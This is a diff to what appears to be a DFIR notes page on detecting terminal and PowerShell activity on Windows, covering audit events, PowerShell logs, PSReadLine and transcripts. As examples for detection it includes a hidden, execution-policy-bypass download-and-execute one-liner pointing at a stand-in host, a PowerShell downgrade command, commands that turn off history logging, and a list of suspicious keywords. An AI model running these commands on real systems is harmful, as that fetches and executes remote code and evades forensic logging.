@@ -163,11 +163,7 @@
   <aside>
    <nav id="TableOfContents">
   <ul>
-    <li><a href="#windows">Windows</a>
-      <ul>
-        <li><a href="#powershell">PowerShell</a></li>
-      </ul>
-    </li>
+    <li><a href="#windows">Windows</a></li>
     <li><a href="#macos">macOS</a></li>
     <li><a href="#references">References</a></li>
   </ul>
@@ -206,12 +202,64 @@
   <div class="content" itemprop="articleBody">
     <p><em>Think of the terminal as a magic wand 🪄 of the attacker. The beauty for them is that they can do all sorts of nasty things remotely, but their beauty also lies with their forensics perks: one can review the history of this activity.</em></p>
 <h2 id="windows">Windows</h2>
-<h3 id="powershell">PowerShell</h3>
+<p>It&rsquo;s possible to track terminal activity starting from Windows Server 2012R2, but it needs to be enabled by default (too noisy). To enable it: Computer Configuration -&gt; Policies -&gt; Admin Templates -&gt; System -&gt; Audit Process Creation. Once enabled, <code>4688</code> (process created, arguments logged) and <code>4689</code> (process exited) can show some of this activity. However, even if not enabled explicitly, some events will be logged anyway (suspicious scripts).</p>
+<blockquote>
+<p>👵🏽 Windows XP, <code>592</code> - tracks process activity but no cmd arguments.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">📕</span> <span class="n">ftp</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-v</span> <span class="n">-s</span><span class="err">:</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">\</span><span class="n">with</span><span class="p">\</span><span class="n">ip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># downgrading powershell instance to v2 with -Version 2</span>
+</span></span><span class="line"><span class="cl"><span class="err">📕</span> <span class="n">powershell</span> <span class="n">-Version</span> <span class="n">2</span> <span class="n">-Command</span> <span class="n">blahblah</span>
+</span></span></code></pre></div><p>Your best bet is to first filter for unusual &ldquo;family relations&rdquo;, like <code>cmd.exe</code> spawning <code>winword.exe</code>.</p>
+<p>🪵 Event logs: 🛡️ <code>Security</code>, 🍌 <code>Microsoft-Windows-PowerShell%4Operational</code> and 🥝 <code>Windows PowerShell.evtx</code> (to track previous versions invocations) and 📞 <code>Microsoft-Windows-WinRM/Operational</code> for PS remoting (on both source and destination systems. Also, check 🫐 <code>PSReadLine</code> (like <code>.bash_history</code> on Linux). Turn on here: Group Policy Management -&gt; Computer Configuration -&gt; Policies -&gt; Admin Templates -&gt; Windows comp -&gt; Windows Powershell. When on, find them here 📂 <code>%UserProfile%\Roaming\Microsoft\Windows\PowerShell\PSReadLine</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">📕</span> <span class="nb">Set-PSReadLineOption</span>
+</span></span><span class="line"><span class="cl"><span class="err">📕</span> <span class="nb">Remove-Module</span> <span class="n">-Name</span> <span class="n">PSReadLine</span>
+</span></span></code></pre></div><p>🍓 <code>Transcript logs</code> (similar to 🫐 but also records the output, not default). When 🍓 is on, stored at 📂 <code>\Users\uname\Docuemnts</code> (by default). Turn on here: Computer Configuration -&gt; Admin Templates -&gt; Windows Components -&gt; Windows Powershell -&gt; Turn on PowerShell Transcript logs.</p>
+<p>🛠️ <code>CyberChef</code></p>
+<table>
+<thead>
+<tr>
+<th>🏺 Artefact</th>
+<th>🖥️ Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>🪵 Event logs</td>
+<td>🛡️<code>4624</code> <code>t3</code> and <code>4672</code></td>
+</tr>
+<tr>
+<td>🗄️ Registry</td>
+<td>ShimCache, BAM/DAM, AmCache (<code>powershell.exe</code>)</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>✍️ Suspicious scripts are written to the logs and marked as 4104 Warning events even if command line auditing is off.</p>
+</blockquote>
+<p>The attacker might use PowerShell for stealth.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">📕</span> <span class="n">powershell</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-nop</span> <span class="n">-noni</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://averylegitdomain/averylegitstring&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">📕</span> <span class="nb">Invoke-Obfuscation</span> <span class="p">...</span> 
+</span></span></code></pre></div><blockquote>
+<p>✍️ Bad strings: download, IEX, rundll32.exe, http, StartProcess, InvokeExpression, Invoke-Command, syswow64, FromBase64String, powershell -Version, Invoke-WMIMethod, Invoke-CIMMethod, Reflection, WebClient, bitstransfer.</p>
+</blockquote>
 <h2 id="macos">macOS</h2>
 <h2 id="references">References</h2>
 <details>
     <summary>Expand&hellip;</summary>
-    Something here
+    <a href="https://www.danielbohannon.com/blog-1/tag/Detection">https://www.danielbohannon.com/blog-1/tag/Detection</a>
 </details>
   </div>
 </article>
